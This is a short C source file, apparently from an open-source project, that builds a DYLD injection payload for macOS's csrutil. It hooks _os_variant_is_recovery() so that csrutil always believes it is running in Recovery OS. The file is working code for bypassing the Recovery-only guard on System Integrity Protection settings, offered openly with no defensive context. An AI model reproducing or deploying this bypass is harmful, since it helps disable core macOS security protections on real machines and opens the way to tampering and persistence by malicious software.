/*
 * csrutil_inject.c — DYLD payload for Apple's csrutil binary.
 *
 * Interposes _os_variant_is_recovery() so Apple's csrutil thinks
 * it's running from Recovery OS.  Apple's own LAContext auth flow
 * and Bootability XPC calls then execute normally — with Apple's
 * code signing and entitlements.
 *
 * Copyright (c) 2025 mSL project — BSD-3-Clause licence.
 */

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

/* ── _os_variant_is_recovery interpose ─────────────────────────────── */

/*
 * The real function from libSystem — weak import so the linker
 * doesn't fail if the symbol isn't found at link time.
 * We resolve it at runtime via dlsym.
 */
__attribute__((weak)) extern bool _os_variant_is_recovery(const char *);

static bool (*real_os_variant_is_recovery)(const char *) = NULL;

static bool my_os_variant_is_recovery(const char *subsystem)
{
    (void)subsystem;
    return true;  /* Always report as Recovery OS. */
}

/*
 * dyld interpose table — placed in __DATA,__interpose.
 * dyld resolves the replacee pointer at load time.
 */
__attribute__((used, section("__DATA,__interpose")))
static const struct {
    void *replacement;
    void *replacee;
} _interpose_table[] = {
    { (void *)my_os_variant_is_recovery,
      (void *)_os_variant_is_recovery },
};

/* ── Constructor ───────────────────────────────────────────────────── */

__attribute__((constructor))
static void csrutil_inject_init(void)
{
    setenv("CSRUTIL_INJECTED", "1", 1);
    real_os_variant_is_recovery = dlsym(RTLD_NEXT, "_os_variant_is_recovery");
    fprintf(stderr, "[inject] csrutil_inject loaded — Recovery OS check bypassed.\n");
}
